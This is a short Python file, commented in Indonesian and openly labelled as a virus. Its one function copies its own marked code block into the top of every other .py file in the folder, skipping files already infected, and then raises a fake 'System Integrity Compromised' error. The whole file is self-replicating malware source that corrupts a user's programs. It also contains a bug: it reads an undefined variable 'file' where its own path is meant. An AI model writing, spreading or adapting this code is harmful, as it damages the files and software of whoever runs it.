import sys
import os

### VIRUS START ###
def replicate_and_crash():
    # 1. Mengambil kode virus ini sendiri
    virus_code = []
    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    in_virus_block = False
    for line in lines:
        if line == "### VIRUS START ###\n": in_virus_block = True
        if in_virus_block: virus_code.append(line)
        if line == "### VIRUS END ###\n": in_virus_block = False

    # 2. Replikasi: Menginfeksi file .py lain di folder yang sama
    for file in os.listdir('.'):
        if file.endswith('.py') and file != 'virus.py':
            with open(file, 'r') as f:
                original_content = f.read()
            
            # Cek apakah file sudah terinfeksi agar tidak double
            if "### VIRUS START ###" not in original_content:
                with open(file, 'w') as f:
                    f.write("".join(virus_code) + "\n" + original_content)
    
    # 3. Trigger Error: Membuat proses 'Add' gagal
    raise Exception("CRITICAL ERROR: System Integrity Compromised by Self-Replicating Script!")
### VIRUS END ###